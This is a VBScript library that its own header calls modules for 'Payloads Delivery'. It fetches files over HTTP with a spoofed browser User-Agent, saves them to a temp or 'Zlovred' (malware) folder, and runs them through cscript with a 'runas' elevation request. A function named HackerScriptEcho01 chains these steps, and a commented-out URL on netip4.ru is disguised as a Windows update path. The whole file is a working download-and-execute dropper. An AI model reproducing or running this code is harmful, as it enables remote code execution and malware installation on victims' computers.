' *********************************************************
'
' LIB_FUNC.VBS
' This file contain main modules for Payloads Delivery
'
' Revision 1.1.0.0 (Extended Beta) May be Present
' The Library Links at lib_func-1.0.0.js
'
' Version 1.1.1.0 (Extended Beta)
'
' *********************************************************
' *********************************************************
'
' getTempEnviron()
' This Function Returns the Path for User Variable TEMP
'
' PARAMETERS:   NONE
' RETURNS:      Path for Zlovred Directory if Exists or
'               Path for User Variable %TEMP% if Success or
'               "C:\Windows\Temp" if API Error or
'				"" if General Sysytem Error
'
' *****************************************************************************/
Function getTempEnviron()
	Dim fso, wsh, envProc, envSys
	Dim strZlFolder ' Zlovred Temprorary Folder
	' Define ActiveX Objects
	Set fso = CreateObject("Scripting.FileSystemObject")
	Set wsh = CreateObject("WScript.Shell")
	' Define Process Environment Variable
	Set envProc = wsh.Environment("PROCESS")
	' Define System Environment Variable
	Set envSys = wsh.Environment
	' Define Zlovred Temprorary Folder
	strZlFolder = "C:\pub1\Distrib\Zlovred"
	' Define and Check Environment Variables
	Dim envVariable
	envVariable = strZlFolder
	If Not fso.FolderExists(envVariable) Then
		envVariable = envProc("TEMP")
		If Not fso.FolderExists(envVariable) Then
			envVariable = envSys("TMP")
			IF Not fso.FolderExists(envVariable) Then
				envVariable = ""
			End If
		End If
	End If
	getTempEnviron = envVariable
End Function

' *********************************************************
'
' UploadFilesFromInt( strFile, strURL, strPath )
' This Function Upload the File strFile from URL on HTTP/HTTPS Protocols
' and Save it on Local Computer to Path strPath
' Function Uses Objects "Microsoft.XMLHTTP" and "Adodb.Stream"
'
' PARAMETERS:   strFile -- a File to be Downloaded (only name and extension)
'               strURL -- an URL of the web-site, from which the File
'               is Downloaded
'               strPath -- a Place in a Windows Computer (Full path without slash)
'               in which the File is Downloaded
'
' RETURNS:      0 -- If File is Normally Downloaded and Created
'               1 -- if File in Path strPath Can't Create
'               2 -- if XMLHTTP or ADOStream Can't Initialize
'				3 -- if Emty HTTP Responce or Send Access Denied
'				4 -- if HTTP Response Not 200 (while is not make)
'
' *********************************************************/
Function UploadFilesFromInt(strFile, strURL, strPath)
	' body...
	On Error Resume Next
	Err.Clear
	Dim fso, xmlHttp, adoStream
	Dim cb0, cb1, cb2, cb3
	' Define FileSystemObject
	Set fso = CreateObject("Scripting.FileSystemObject")
	If Err.Number <> 0 Then
		UploadFilesFromInt = 1
	Else
		Err.Clear
		' Define XMLHTTP Help Object
		' Set xmlHttp = getXmlHttp02
		Set xmlHttp = CreateObject("Microsoft.XMLHTTP")
		If IsNull(xmlHttp) Then
			UploadFilesFromInt = 2
		Else
			' Define Adodb.Stream Object
			Set adoStream = CreateObject("Adodb.Stream")
			if Err.Number <> 0 Then
				UploadFilesFromInt = 2
			else
				Err.Clear
				Dim strFileURL
				Dim strLocal_Path
				Dim intUploadFilesFromInt
				Dim blnExistRemoteFile
				Dim cb(4)
				' Define Full Downloaded File URL
				strFileURL = strURL & strFile
				' Define Full Local Path to be Downloaded
				strLocal_Path = strPath & "\" & strFile
				intUploadFilesFromInt = 0
				' Check if Path is Exist
				if fso.FolderExists(strPath) Then
					intUploadFilesFromInt = 0
				else
					intUploadFilesFromInt = 1
				end if
				If fso.FileExist(strLocal_Path) Then
					fso.DeleteFile strLocal_Path, true
				End If
				' WScript.Echo "int = " & intUploadFilesFromIntWithHTTP01

				' Downloaded File
				' Open URL (Get Requiest synchronous)
				Err.Clear
				xmlHttp.Open "GET", strFileURL, false
				If Err.Number <> 0 Then
					WScript.Echo "Can't Open URL: " & strFileURL & vbNewLine & "Error: " & Str(Err.Number)
					UploadFilesFromInt = 3
				Else
					Err.Clear
					' Set User-Agent Header (for Safari Browser)
					' WScript.Echo "Test!"
					xmlHttp.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
					' Define Function onreadystatechange
					'xmlHttp.onreadystatechange = GetRef("xmlHTTP_OnReadyStateChange")
					'if(xmlHttp.readyState === 4) {
					'	cb[0] = xmlHttp.status; // Status of Request (Integer Number)
					'	cb[1] = xmlHttp.getAllResponseHeaders(); // Response Header
					'	cb[2] = xmlHttp.responseText; // Response Text
					'	cb[3] = xmlHttp.responseBody; // Response Body
					'}

					' Send File from URL

					xmlHttp.Send
					' /*** Test ***/
					' Wscript.Echo "Download-Status: " & xmlhttp.Status & " " & xmlhttp.statusText
						'xmlHttp.WaitForResponse
						'WScript.Echo "Can't make Send() Request!" & vbNewLine & "May be Block with Antivirus?" & vbNewLine & "Err = " & Str(Err.Number)
						'UploadFilesFromInt = 3
						'xmlHttp.Abort
						Err.Clear
						
						cb0 = xmlHttp.Status
						cb1 = xmlHttp.getAllResponseHeaders
						cb2 = xmlHttp.responseText
						cb3 = xmlHttp.responseBody
						If cb0 = 200 And intUploadFilesFromInt = 0 Then
							' WScript.Echo "XmlHttp Status = " & cb0 & vbNewLine
							' If Send Request is Successful
							blnExistRemoteFile = true
						Else
							blnExistRemoteFile = false
							intUploadFilesFromInt = 4
							WScript.Echo "Wrong HTTP Status:" & cb0 & vbNewLine & "nURL = " & strFileURL
							xmlHttp.Abort
						End If
						If blnExistRemoteFile = true Then
							' Set AdoStream Type mode and Open It
							adoStream.Type = 1
							adoStream.Mode = 3
							adoStream.Open
							' Write to AdoStream Response Body of HTTP Request
							Err.Clear
							adoStream.Write(cb3)
							If Err.Number <> 0 Then
								WScript.Echo "Can't Save Data to the Stream." & vbNewLine & "Error Status: " & Err.Number & vbNewLine
							End If
							' WScript.Echo "The Local File Path = " & strLocal_Path & vbNewLine
							' Save Stream to strFile
							Err.Clear ' Must be Heare!
							adoStream.SaveToFile strLocal_Path, 2
							If Err.Number <> 0 Then
								WScript.Echo "Can't Save File Stream into File: " & strLocal_Path & vbNewLine & "Check Access Rights!" & vbNewLine &_ 
									"Error Status: " & Err.Number & ". The Error " & Err.Description & " has occurred." & vbNewLine
								intUploadFilesFromInt = 1
							Else
								' /Downloaded File
								' Close Objects
								adoStream.Close
								xmlHttp.Abort
								' Check If File Downloaded
								If Not fso.FileExists(strLocal_Path) And intUploadFilesFromInt = 0 Then
									Wscript.Echo strLocal_Path & " is not found!"
									intUploadFilesFromInt = 1
								End If
							End If
						End If
				End If
				UploadFilesFromInt = intUploadFilesFromInt
				' WScript.Echo strLocal_Path
			end if
		End If
	End If
End Function

' ******************************************************************************
'
' RunDownloadedScript01( strPath, strVBS, intTimeOut )
' This Function Run Hidden a strVBS File
' with Command "cscript //NoLogo " & strPath & "\" & strVBS
'
' PARAMETERS:   strPath -- The Path to strVBS
'               strVBS -- a VBS File with instructions
'               (Windows Scripts Shell)
'				intTimeOut -- Estimated Time for Running (ms)
'
' RETURNS:      0 if Success
'				1 if Path not Found
'
'******************************************************************************/
Function RunDownloadedScript01(strPath, strVBS, intTimeOut)
	Dim constRun_VBS, constOpt
	' Define Windows Scripts Options
	constRun_VBS = "//Nologo "
	' Define VBS Script Options (Empty)
	constOpt = ""
	Dim strValue, shApp, fso, wsh, envProc, pathCMD
	' Define ActiveX Object
	Set shApp = CreateObject("Shell.Application")
	Set fso = CreateObject("Scripting.FileSystemObject")
	Set wsh = CreateObject("WScript.Shell")
	Set envProc = wsh.Environment("PROCESS")
	pathCMD = envProc("SystemRoot") & "\System32"
	' Check Paths
	If Not fso.FileExists(pathCMD & "\cscript.exe") Then
		RunDownloadedScript01 = 1
	Else
		If Not fso.FileExists(strPath + "\" + strVBS) Then
			RunDownloadedScript01 = 1
		Else
			' Set Cscript Command Arguments
			strValue = constRun_VBS & Chr(34) & strPath & "\" & strVBS & Chr(34) & constOpt
			' Run cscript.exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
			shApp.ShellExecute pathCMD & "\cscript.exe", strValue, strPath, "runas", 1
			' Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done
			WScript.Sleep intTimeOut
			RunDownloadedScript01 = 0
		End If
	End If
End Function

'* ********************************************************
'
' ScriptDownlRun01( strURL , strFileNameWSH, iTimeOut )
'
' This Script Downloads Exe file from strURL Path and
' Execute it with Script TimeOut in iTimeOut ms
'
' PARAMETERS:	strURL an URL Path to Download
' 				strFileNameWSH - Name of WSH File
'				iTimeOut is Wait to End Execution of the File
' RETURNS:		0 if Success Download and Run
'				1 if Error Occur
'
' *********************************************************/
Function ScriptDownlRun01(strURL, strFileNameWSH, iTimeOut)
	Dim iFlag
	Dim tempFolder
	' Get Temp Folder Name
	tempFolder = getTempEnviron
	' Check if strFolder is Empty of TEMP Directory not Assigned
	If Len(tempFolder) = 0 Then
		ScriptDownlRun01 = 1
	Else
		iFlag = UploadFilesFromInt(strFileNameWSH, strURL, tempFolder)
		If iFlag <> 0 Then
			ScriptDownlRun01 = 1
		Else
			RunDownloadedScript01 tempFolder, strFileNameWSH, iTimeOut
			ScriptDownlRun01 = 0
		End If
	End If
End Function

'* *********************************************************
'
' HackerScriptEcho01()
'
' This Script Repair HackerScript Library Folders
'
' PARAMETERS:	NONE;
' GLOBALS:		strHackURL is URL Path to Download
'				iTimeOut01 is Wait to End Execution of the File
' 				strHackScript - Name of Exe File
'				constHackOpt is Options of Exe File
'				strDownlScript is a Download Script
' RETURNS:		0 if Success Download and Run
'				1 if Folder Already Exists
'				2 if Error Occur
'
' *********************************************************/
Function HackerScriptEcho01()
	Dim strHackURL, strHackScript, iTimeOut01
'	strHackURL = "http://file.netip4.ru/WinUpdate/InitialCommon/"
	strHackURL = "http://localhost/"
	strHackScript = "echo.wsf"
	iTimeOut01 = 1000 ' 1 sec
	Dim iFlag
	iFlag = 1
	iFlag = ScriptDownlRun01(strHackURL, strHackScript, iTimeOut01)
	If iFlag = 1 Then
		HackerScriptEcho01 = 2
	Else
		HackerScriptEcho01 = 0
	End If
End Function

' WScript.Echo "Error Code: " & RunDownloadedScript01( "C:\Users\yuden", "echo.wsf", 10000 )
' WScript.Echo HackerScriptEcho01
